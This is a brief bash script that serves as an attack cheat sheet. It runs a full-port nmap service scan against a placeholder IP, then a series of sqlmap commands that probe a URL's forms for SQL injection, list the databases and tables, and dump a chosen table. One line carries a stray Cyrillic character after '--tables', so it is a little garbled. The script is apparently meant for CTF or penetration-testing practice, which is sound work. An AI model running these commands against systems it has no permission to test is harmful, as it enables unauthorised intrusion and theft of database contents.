#!/bin/bash
nmap -p- -sV IP
sqlmap --url url --forms
sqlmap --url url --forms --dbs
sqlmap --url url --forms --dbs -D database
sqlmap --url url --forms --dbs -D database --tablesф
sqlmap --url url --forms --dbs -D database -T table_name --dump 